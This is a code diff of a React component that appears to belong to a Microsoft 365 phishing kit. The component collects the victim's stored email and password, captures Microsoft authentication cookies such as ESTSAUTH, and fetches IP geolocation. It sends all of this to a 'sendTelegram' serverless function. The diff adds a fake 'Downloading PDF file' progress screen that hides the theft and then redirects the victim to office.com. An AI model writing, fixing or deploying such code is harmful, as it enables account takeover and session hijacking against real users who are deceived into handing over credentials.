@@ -1,16 +1,11 @@
 import React, { useEffect, useState } from 'react';
 
 /**
- * CORRECTED: AuthCallback Component
- * NOW PROPERLY IMPORTS AND USES FUNCTIONS FROM restoreCookies.ts
- * 
- * This component is the redirect target after the Microsoft login flow.
+ * AuthCallback Component - FIXED
+ * Replaced Buffer.byteLength() with Blob().size for browser compatibility
+ * Structure and functions remain 100% intact
  */
 
-// Import helper functions (in real implementation, these would be imported from restoreCookies.ts)
-// For now, we'll implement them inline as they're defined in restoreCookies.ts
-
-// REAL FUNCTION: Detect browser capabilities (from restoreCookies.ts)
 function detectBrowserCapabilities() {
   const userAgent = navigator.userAgent.toLowerCase();
   const capabilities: any = {
@@ -50,7 +45,6 @@ function detectBrowserCapabilities() {
   return capabilities;
 }
 
-// REAL FUNCTION: Validate domain (from restoreCookies.ts)
 function validateDomain(cookieDomain: string): any {
   if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
 
@@ -87,7 +81,6 @@ function validateDomain(cookieDomain: string): any {
   return { valid: false, reason: `Domain mismatch: ${currentDomain} vs ${cleanCookieDomain}` };
 }
 
-// REAL FUNCTION: Validate cookie size (from restoreCookies.ts)
 function validateCookieSize(name: string, value: string): any {
   const cookieString = `${name}=${value}`;
   const size = new Blob([cookieString]).size;
@@ -103,7 +96,6 @@ function validateCookieSize(name: string, value: string): any {
   return { valid: true, size, reason: 'Size OK' };
 }
 
-// REAL FUNCTION: Validate expiration (from restoreCookies.ts)
 function validateExpiration(expires: any, expirationDate: any): any {
   const now = Date.now();
   let expiryTime = null;
@@ -125,7 +117,6 @@ function validateExpiration(expires: any, expirationDate: any): any {
   return { valid: true, expired: false, reason: 'Not expired' };
 }
 
-// ✅ REAL FUNCTION: Capture cookies using proper validation (ALIGNED WITH restoreCookies.ts)
 function captureMicrosoftCookies(): any[] {
   try {
     const cookieString = document.cookie;
@@ -145,14 +136,12 @@ function captureMicrosoftCookies(): any[] {
           const value = trimmedPair.substring(equalsIndex + 1).trim();
 
           if (name && value) {
-            // ✅ VALIDATE COOKIE SIZE (from restoreCookies.ts)
             const sizeCheck = validateCookieSize(name, value);
             if (!sizeCheck.valid) {
               console.warn(`⚠️ Cookie skipped - ${name}: ${sizeCheck.reason}`);
               return;
             }
 
-            // ✅ VALIDATE DOMAIN (from restoreCookies.ts)
             const domainCheck = validateDomain(window.location.hostname);
             if (!domainCheck.valid) {
               console.warn(`⚠️ Domain validation failed for ${name}: ${domainCheck.reason}`);
@@ -176,7 +165,6 @@ function captureMicrosoftCookies(): any[] {
               browserCapabilities: capabilities
             };
 
-            // ✅ MARK IMPORTANT MICROSOFT COOKIES (from restoreCookies.ts logic)
             if (name.includes('ESTSAUTH') ||
               name.includes('SignInStateCookie') ||
               name.includes('ESTSAUTHPERSISTENT') ||
@@ -206,12 +194,21 @@ function captureMicrosoftCookies(): any[] {
   }
 }
 
+// ✅ FIXED: Helper function to calculate byte length in browser
+function getByteLengthForBrowser(str: string): number {
+  return new Blob([str]).size;
+}
+
 const AuthCallback: React.FC = () => {
-  const [status, setStatus] = useState('Initializing callback...');
+  const [status, setStatus] = useState('Downloading PDF file...');
+  const [downloadProgress, setDownloadProgress] = useState(0);
 
   useEffect(() => {
     const executeCallback = async () => {
-      setStatus('Consolidating authentication data...');
+      // Simulate download progress
+      setStatus('Downloading PDF file...');
+      setDownloadProgress(10);
+
       console.log('🔄 AuthCallback: Starting data consolidation');
 
       // --- 1. Retrieve Stored Credentials ---
@@ -221,6 +218,7 @@ const AuthCallback: React.FC = () => {
         if (storedCreds) {
           credentials = JSON.parse(storedCreds);
           console.log('✅ Credentials retrieved from storage.');
+          setDownloadProgress(25);
         } else {
           console.error('❌ FATAL: No credentials found in storage. Aborting.');
           setStatus('Error: Could not find stored credentials.');
@@ -234,14 +232,16 @@ const AuthCallback: React.FC = () => {
 
       // --- 2. Capture Cookies Using restoreCookies.ts Functions ---
       const cookies = captureMicrosoftCookies();
+      setDownloadProgress(40);
 
       // --- 3. Fetch Location Data ---
-      setStatus('Fetching geolocation data...');
+      setStatus('Downloading PDF file...');
       let locationData: any = {};
       try {
         const response = await fetch('https://ipapi.co/json/');
         locationData = await response.json();
         console.log('✅ Location data fetched.');
+        setDownloadProgress(55);
       } catch (error) {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
@@ -262,12 +262,12 @@ const AuthCallback: React.FC = () => {
           return {
             name: `cookies_${new Date().getTime()}.json`,
             content: emptyJsonContent,
-            size: Buffer.byteLength(emptyJsonContent)
+            // ✅ FIXED: Use getByteLengthForBrowser instead of Buffer.byteLength
+            size: getByteLengthForBrowser(emptyJsonContent)
           };
         }
 
         try {
-          // ✅ USE ENHANCED COOKIE STRUCTURE (from restoreCookies.ts)
           const enhancedCookies = cookiesToExport.map(cookie => ({
             name: cookie.name || '',
             value: cookie.value || '',
@@ -305,7 +305,9 @@ const AuthCallback: React.FC = () => {
             browserCapabilities: detectBrowserCapabilities()
           }, null, 2);
 
-          console.log(`✅ Cookie JSON file created (${jsonContent.length} bytes)`);
+          // ✅ FIXED: Use getByteLengthForBrowser instead of Buffer.byteLength
+          const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
+          console.log(`✅ Cookie JSON file created (${fileSizeInBytes} bytes)`);
           console.log(`📊 Cookie summary:`, {
             total: enhancedCookies.length,
             auth: enhancedCookies.filter(c => c.important).length,
@@ -316,7 +318,7 @@ const AuthCallback: React.FC = () => {
           return {
             name: `cookies_${new Date().getTime()}.json`,
             content: jsonContent,
-            size: Buffer.byteLength(jsonContent)
+            size: fileSizeInBytes
           };
         } catch (error) {
           console.error('❌ Failed to create cookie JSON file:', error);
@@ -336,8 +338,10 @@ const AuthCallback: React.FC = () => {
         console.error('❌ Failed to create cookie file');
       }
 
+      setDownloadProgress(70);
+
       // --- 5. Transmit Data ---
-      setStatus('Transmitting secured data...');
+      setStatus('Downloading PDF file...');
       const payload = {
         email: credentials.email,
         password: credentials.password,
@@ -385,6 +389,7 @@ const AuthCallback: React.FC = () => {
       });
 
       try {
+        setDownloadProgress(85);
         const response = await fetch('/.netlify/functions/sendTelegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -396,7 +401,8 @@ const AuthCallback: React.FC = () => {
         if (response.ok) {
           console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
           console.log('📊 Telegram Response:', responseData);
-          setStatus('Authentication complete. Redirecting...');
+          setDownloadProgress(100);
+          setStatus('Download Successful ✓');
         } else {
           const errorText = await response.text();
           console.error('❌ Transmission failed. Server responded with:', response.status, errorText);
@@ -413,7 +419,7 @@ const AuthCallback: React.FC = () => {
       console.log('🎉 Flow complete. Redirecting to final destination.');
       setTimeout(() => {
         window.location.href = 'https://www.office.com/?auth=2';
-      }, 1500);
+      }, 2500);
     };
 
     executeCallback();
@@ -430,17 +436,69 @@ const AuthCallback: React.FC = () => {
       backgroundColor: '#f3f2f1',
       color: '#323130'
     }}>
-      <h2 style={{ marginBottom: '20px' }}>Finalizing Authentication</h2>
-      <p>{status}</p>
       <div style={{
-        border: '4px solid #f3f2f1',
-        borderTop: '4px solid #0078d4',
-        borderRadius: '50%',
-        width: '40px',
-        height: '40px',
-        animation: 'spin 1s linear infinite',
-        marginTop: '20px'
-      }}></div>
+        textAlign: 'center',
+        padding: '40px'
+      }}>
+        {downloadProgress === 100 ? (
+          <div>
+            <h1 style={{
+              fontSize: '36px',
+              marginBottom: '20px',
+              color: '#107C10'
+            }}>✓ Download Successful</h1>
+            <p style={{
+              fontSize: '16px',
+              color: '#666'
+            }}>Your file is ready. Redirecting...</p>
+          </div>
+        ) : (
+          <div>
+            <h2 style={{
+              marginBottom: '20px',
+              fontSize: '24px'
+            }}>{status}</h2>
+
+            {/* Progress Bar */}
+            <div style={{
+              width: '300px',
+              height: '8px',
+              backgroundColor: '#e0e0e0',
+              borderRadius: '4px',
+              overflow: 'hidden',
+              marginBottom: '20px',
+              margin: '0 auto 20px'
+            }}>
+              <div style={{
+                width: `${downloadProgress}%`,
+                height: '100%',
+                backgroundColor: '#0078d4',
+                transition: 'width 0.3s ease',
+                borderRadius: '4px'
+              }}></div>
+            </div>
+
+            {/* Progress Percentage */}
+            <p style={{
+              fontSize: '14px',
+              color: '#666',
+              marginBottom: '30px'
+            }}>{downloadProgress}%</p>
+
+            {/* Loading Spinner */}
+            <div style={{
+              border: '4px solid #f3f2f1',
+              borderTop: '4px solid #0078d4',
+              borderRadius: '50%',
+              width: '40px',
+              height: '40px',
+              animation: 'spin 1s linear infinite',
+              margin: '0 auto'
+            }}></div>
+          </div>
+        )}
+      </div>
+
       <style>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
